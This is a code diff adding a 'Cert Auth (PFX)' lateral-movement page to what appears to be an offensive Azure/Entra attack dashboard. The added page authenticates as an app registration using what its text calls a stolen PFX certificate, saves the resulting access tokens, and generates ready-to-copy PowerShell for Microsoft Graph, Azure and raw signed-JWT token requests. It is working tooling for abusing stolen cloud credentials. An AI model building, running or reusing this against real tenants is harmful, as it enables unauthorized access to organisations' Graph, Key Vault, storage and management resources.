@@ -295,6 +295,34 @@
     .jwt-payload-color { color: var(--cyan); }
     .jwt-sig-color     { color: #484f58; }
 
+    /* ── Manual command blocks ──────────────────────────────── */
+    .code-block {
+      background: #010409;
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      color: var(--cyan);
+      font-family: "SFMono-Regular", ui-monospace, Consolas, "Liberation Mono", Menlo, monospace;
+      font-size: 12px;
+      line-height: 1.6;
+      margin: 0;
+      overflow-x: auto;
+      padding: 12px 40px 12px 14px;
+      white-space: pre;
+    }
+    .copy-code-btn {
+      background: none;
+      border: none;
+      color: var(--muted);
+      cursor: pointer;
+      font-size: 14px;
+      padding: 4px 6px;
+      position: absolute;
+      right: 6px;
+      top: 6px;
+      transition: color 0.1s;
+    }
+    .copy-code-btn:hover { color: var(--text); }
+
     /* ── Token section extras ─────────────────────────────── */
     .token-id { font-family: monospace; font-size: 11px; color: var(--muted); }
     .expiry-ok   { color: var(--green); }
@@ -343,6 +371,11 @@
     <div class="nav-section">Storage</div>
     <div class="nav-item" data-section="storagerecon">
       <span class="nav-icon">&#128230;</span><span>Storage Recon</span>
+    </div>
+
+    <div class="nav-section">Lateral Movement</div>
+    <div class="nav-item" data-section="certauth">
+      <span class="nav-icon">&#128209;</span><span>Cert Auth (PFX)</span>
     </div>
 
     <div class="nav-section">Graph</div>
@@ -628,6 +661,118 @@
         </div>
         <div class="card-body">
           <div class="log-box" id="storageLog" role="log" aria-live="polite"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════ CERT AUTH ══════════════════════════ -->
+    <div class="section" id="sec-certauth">
+      <div class="page-title">&#128209; Cert Auth (PFX)</div>
+      <div class="card">
+        <div class="card-header"><h2>Configuration</h2></div>
+        <div class="card-body">
+          <p style="font-size:13px;color:var(--muted);margin-bottom:16px">Authenticate as an app registration using a stolen PFX certificate (OAuth 2.0 <strong>client credentials</strong> + signed JWT client assertion). The resulting access token is saved to the token store.</p>
+          <form id="certForm" autocomplete="off" enctype="multipart/form-data">
+            <div class="form-grid">
+              <div class="field full">
+                <label>PFX File <em>*</em></label>
+                <input type="file" id="certPfxFile" accept=".pfx,.p12" style="padding:6px 10px;cursor:pointer">
+              </div>
+              <div class="field">
+                <label>PFX Password <span style="font-weight:400;color:#484f58">(leave blank if none)</span></label>
+                <input type="password" id="certPfxPassword" placeholder="password" spellcheck="false">
+              </div>
+              <div class="field">
+                <label>Client ID <em>*</em></label>
+                <input type="text" id="certClientId" placeholder="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx" spellcheck="false">
+              </div>
+              <div class="field">
+                <label>Tenant ID <em>*</em></label>
+                <input type="text" id="certTenantId" placeholder="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx" spellcheck="false">
+              </div>
+              <div class="field full">
+                <label>Scope <em>*</em></label>
+                <select id="certScopePreset" onchange="certScopePresetChange()">
+                  <option value="https://management.azure.com/.default">Azure Management (ARM)</option>
+                  <option value="https://graph.microsoft.com/.default">Microsoft Graph</option>
+                  <option value="https://vault.azure.net/.default">Key Vault</option>
+                  <option value="https://storage.azure.com/.default">Azure Storage</option>
+                  <option value="custom">Custom…</option>
+                </select>
+              </div>
+              <div class="field full" id="certCustomScopeField" style="display:none">
+                <label>Custom Scope</label>
+                <input type="text" id="certCustomScope" placeholder="https://resource.azure.com/.default" spellcheck="false">
+              </div>
+              <div class="field full">
+                <label>Label <span style="font-weight:400;color:#484f58">(optional — auto-derived from token if blank)</span></label>
+                <input type="text" id="certLabel" placeholder="e.g. corp-app-arm" spellcheck="false">
+              </div>
+            </div>
+            <div class="actions">
+              <button type="submit" class="btn-primary" id="certAuthBtn">&#128273; Authenticate</button>
+              <span class="status" id="certStatus"><span class="spinner"></span><span id="certStatusText"></span></span>
+            </div>
+          </form>
+        </div>
+      </div>
+
+      <!-- Result card (hidden until auth succeeds) -->
+      <div class="card" id="certResultCard" style="display:none;margin-top:16px">
+        <div class="card-header"><h2>&#10003; Token Acquired</h2></div>
+        <div class="card-body">
+          <div class="form-grid">
+            <div class="field" style="grid-column:1/-1">
+              <label>Saved as</label>
+              <div id="certResultLabel" style="font-size:13px;padding:4px 0;font-family:monospace"></div>
+            </div>
+            <div class="field" style="grid-column:1/-1">
+              <label>Access Token (preview)</label>
+              <div class="jwt-box" id="certAccessTokenBox" style="max-height:120px"></div>
+            </div>
+            <div class="field">
+              <label>Expires In</label>
+              <div id="certExpiresIn" style="font-size:13px;padding:4px 0"></div>
+            </div>
+          </div>
+          <div class="actions" style="margin-top:8px">
+            <button class="btn-ghost" onclick="certCopyToken()">&#128203; Copy Access Token</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Manual command reference card -->
+      <div class="card" style="margin-top:16px">
+        <div class="card-header">
+          <h2>&#128196; Manual Commands</h2>
+          <span style="font-size:11px;color:var(--muted)">Updates as you fill in the form above</span>
+        </div>
+        <div class="card-body">
+          <p style="font-size:12px;color:var(--muted);margin:0 0 12px">Use these if you prefer to run the authentication manually in PowerShell instead of through the web UI.</p>
+
+          <div style="margin-bottom:16px">
+            <div style="font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:.05em;color:var(--muted);margin-bottom:6px">Microsoft Graph (Connect-MgGraph)</div>
+            <div style="position:relative">
+              <pre id="cmdMgGraph" class="code-block"></pre>
+              <button class="copy-code-btn" onclick="copyCertCmd('cmdMgGraph')" title="Copy">&#128203;</button>
+            </div>
+          </div>
+
+          <div style="margin-bottom:16px">
+            <div style="font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:.05em;color:var(--muted);margin-bottom:6px">Azure PowerShell (Connect-AzAccount)</div>
+            <div style="position:relative">
+              <pre id="cmdAzAccount" class="code-block"></pre>
+              <button class="copy-code-btn" onclick="copyCertCmd('cmdAzAccount')" title="Copy">&#128203;</button>
+            </div>
+          </div>
+
+          <div>
+            <div style="font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:.05em;color:var(--muted);margin-bottom:6px">Raw REST token request (PowerShell)</div>
+            <div style="position:relative">
+              <pre id="cmdRawRest" class="code-block"></pre>
+              <button class="copy-code-btn" onclick="copyCertCmd('cmdRawRest')" title="Copy">&#128203;</button>
+            </div>
+          </div>
         </div>
       </div>
     </div>
@@ -1676,6 +1821,140 @@ document.getElementById('onedriveRunBtn').addEventListener('click', function() {
       document.getElementById('onedriveBody').innerHTML = html || emptyRow(6, 'No files returned.');
     }
   });
+});
+
+/* ══ CERT AUTH (Lateral Movement) ══ */
+var _certAccessToken = '';
+
+window.certScopePresetChange = function() {
+  var val = document.getElementById('certScopePreset').value;
+  document.getElementById('certCustomScopeField').style.display = val === 'custom' ? '' : 'none';
+  certUpdateCommands();
+};
+
+window.certCopyToken = function() {
+  if (_certAccessToken) {
+    navigator.clipboard.writeText(_certAccessToken).catch(function() {
+      prompt('Copy token:', _certAccessToken);
+    });
+  }
+};
+
+window.copyCertCmd = function(id) {
+  var text = document.getElementById(id).textContent;
+  navigator.clipboard.writeText(text).catch(function() { prompt('Copy:', text); });
+};
+
+function certUpdateCommands() {
+  var pfxFile  = document.getElementById('certPfxFile').files[0];
+  var pfxPath  = pfxFile ? pfxFile.name : '/path/to/certificate.pfx';
+  var clientId = document.getElementById('certClientId').value.trim() || '<ClientId>';
+  var tenantId = document.getElementById('certTenantId').value.trim() || '<TenantId>';
+  var scopePreset = document.getElementById('certScopePreset').value;
+  var scope = scopePreset === 'custom'
+    ? (document.getElementById('certCustomScope').value.trim() || '<scope>')
+    : scopePreset;
+
+  document.getElementById('cmdMgGraph').textContent =
+    '$PfxPath  = "' + pfxPath + '"\n' +
+    '$ClientId = "' + clientId + '"\n' +
+    '$TenantId = "' + tenantId + '"\n' +
+    '\n' +
+    '$AppCertificate = Get-PfxCertificate -FilePath $PfxPath\n' +
+    'Connect-MgGraph -Certificate $AppCertificate -ClientId $ClientId -TenantId $TenantId';
+
+  document.getElementById('cmdAzAccount').textContent =
+    '$PfxPath     = "' + pfxPath + '"\n' +
+    '$ClientId    = "' + clientId + '"\n' +
+    '$TenantId    = "' + tenantId + '"\n' +
+    '$Certificate = [System.Security.Cryptography.X509Certificates.X509Certificate2]::new($PfxPath)\n' +
+    '\n' +
+    'Connect-AzAccount -ServicePrincipal `\n' +
+    '    -TenantId     $TenantId `\n' +
+    '    -ApplicationId $ClientId `\n' +
+    '    -CertificateThumbprint $Certificate.Thumbprint';
+
+  document.getElementById('cmdRawRest').textContent =
+    '$PfxPath  = "' + pfxPath + '"\n' +
+    '$ClientId = "' + clientId + '"\n' +
+    '$TenantId = "' + tenantId + '"\n' +
+    '$Scope    = "' + scope + '"\n' +
+    '\n' +
+    '# Load certificate and build signed JWT assertion\n' +
+    '$Cert    = [System.Security.Cryptography.X509Certificates.X509Certificate2]::new($PfxPath)\n' +
+    '$Now     = [int][double]::Parse((Get-Date -UFormat %s))\n' +
+    '$Aud     = "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token"\n' +
+    '$Header  = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(\'{"alg":"RS256","typ":"JWT","x5t":"\' + [Convert]::ToBase64String($Cert.GetCertHash()) + \'"}\')) -replace \'/\'\n' +
+    '$Payload = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(\'{"aud":"\' + $Aud + \'","exp":\' + ($Now+600) + \',"iss":"\' + $ClientId + \'","sub":"\' + $ClientId + \'","nbf":\' + $Now + \'}\')) -replace \'/\'\n' +
+    '$RSA     = [System.Security.Cryptography.X509Certificates.RSACertificateExtensions]::GetRSAPrivateKey($Cert)\n' +
+    '$Sig     = [Convert]::ToBase64String($RSA.SignData([Text.Encoding]::UTF8.GetBytes("$Header.$Payload"), [Security.Cryptography.HashAlgorithmName]::SHA256, [Security.Cryptography.RSASignaturePadding]::Pkcs1)) -replace \'/\'\n' +
+    '$Assertion = "$Header.$Payload.$Sig"\n' +
+    '\n' +
+    '# Exchange assertion for access token\n' +
+    '$Body = @{\n' +
+    '    client_id             = $ClientId\n' +
+    '    client_assertion_type = "urn:ietf:params:oauth:client-assertion-type:jwt-bearer"\n' +
+    '    client_assertion      = $Assertion\n' +
+    '    grant_type            = "client_credentials"\n' +
+    '    scope                 = $Scope\n' +
+    '}\n' +
+    '$Token = Invoke-RestMethod -Method POST -Uri $Aud -Body $Body\n' +
+    '$Token.access_token';
+}
+
+// Wire up live update on all relevant inputs.
+['certPfxFile','certClientId','certTenantId','certCustomScope'].forEach(function(id) {
+  var el = document.getElementById(id);
+  if (el) el.addEventListener(id === 'certPfxFile' ? 'change' : 'input', certUpdateCommands);
+});
+certUpdateCommands(); // initial render
+
+document.getElementById('certForm').addEventListener('submit', async function(e) {
+  e.preventDefault();
+  var pfxFile = document.getElementById('certPfxFile').files[0];
+  if (!pfxFile) { alert('Please select a PFX file.'); return; }
+
+  var clientId = document.getElementById('certClientId').value.trim();
+  var tenantId = document.getElementById('certTenantId').value.trim();
+  if (!clientId || !tenantId) { alert('Client ID and Tenant ID are required.'); return; }
+
+  var scopePreset = document.getElementById('certScopePreset').value;
+  var scope = scopePreset === 'custom'
+    ? document.getElementById('certCustomScope').value.trim()
+    : scopePreset;
+  if (!scope) { alert('Please select or enter a scope.'); return; }
+
+  var fd = new FormData();
+  fd.append('pfxFile',      pfxFile);
+  fd.append('pfxPassword',  document.getElementById('certPfxPassword').value);
+  fd.append('clientId',     clientId);
+  fd.append('tenantId',     tenantId);
+  fd.append('scope',        scope);
+  fd.append('label',        document.getElementById('certLabel').value.trim());
+
+  var btn = document.getElementById('certAuthBtn');
+  btn.disabled = true;
+  showStatus('cert', 'running', 'Authenticating\u2026');
+  document.getElementById('certResultCard').style.display = 'none';
+
+  try {
+    var r = await fetch('/api/lateral/cert-auth', { method: 'POST', body: fd });
+    var data = await r.json();
+    if (!r.ok) { throw new Error(data.error || r.statusText); }
+
+    _certAccessToken = data.accessToken || '';
+    var mins = Math.round((data.expiresIn || 3600) / 60);
+    document.getElementById('certAccessTokenBox').textContent =
+      _certAccessToken.substring(0, 200) + (_certAccessToken.length > 200 ? '\u2026' : '');
+    document.getElementById('certExpiresIn').textContent = mins + ' minutes';
+    document.getElementById('certResultLabel').textContent = data.label || '';
+    document.getElementById('certResultCard').style.display = '';
+    showStatus('cert', 'done', '\u2713 Token saved \u2014 ' + (data.label || ''));
+    loadTokens();
+  } catch(err) {
+    showStatus('cert', 'error', '\u2717 ' + err.message);
+  }
+  btn.disabled = false;
 });
 
 /* ════════════════════════════════════════════════════════════════════
